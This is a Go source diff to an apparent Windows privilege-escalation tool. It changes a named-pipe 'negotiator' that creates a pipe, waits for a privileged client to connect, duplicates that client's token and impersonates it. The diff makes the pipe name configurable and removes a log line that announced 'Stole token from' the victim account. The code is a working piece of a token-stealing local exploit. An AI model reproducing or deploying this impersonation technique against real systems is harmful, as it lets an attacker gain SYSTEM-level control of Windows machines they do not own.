@@ -2,18 +2,19 @@ package main
 
 import (
 	"fmt"
-	"os"
 	"syscall"
 	"unsafe"
 
 	"golang.org/x/sys/windows"
 )
 
-type NamedPipeNegotiator struct{}
+type NamedPipeNegotiator struct {
+	Name string
+}
 
 func (negotiator NamedPipeNegotiator) Serve() NegotiatorResult {
 	var sd windows.SECURITY_DESCRIPTOR
-	pipeName := "\\\\.\\pipe\\test"
+	pipeName := "\\\\.\\pipe\\" + negotiator.Name
 
 	_, _, err := initializeSecurityDescriptor.Call(uintptr(unsafe.Pointer(&sd)), 1)
 	if err == syscall.Errno(0) {
@@ -37,7 +38,7 @@ func (negotiator NamedPipeNegotiator) Serve() NegotiatorResult {
 		return NegotiatorResult{nil, err}
 	}
 
-	fmt.Println("[+] Created pipe, listening for connections")
+	fmt.Println("[+] Created pipe at " + pipeName)
 	err = windows.ConnectNamedPipe(pipeHandle, nil)
 
 	if err != nil {
@@ -85,12 +86,6 @@ func (negotiator NamedPipeNegotiator) Serve() NegotiatorResult {
 		fmt.Println("[!] Failed to duplicate client token")
 		return NegotiatorResult{nil, err}
 	}
-
-	hostName, _ := os.Hostname()
-	principal, _ := systemToken.GetTokenUser()
-	sid := principal.User.Sid
-	account, domain, _, _ := sid.LookupAccount(hostName)
-	fmt.Println("[+] Stole token from " + domain + "\\" + account + " (" + sid.String() + ")")
 
 	windows.RevertToSelf()
 	windows.CloseHandle(pipeHandle)
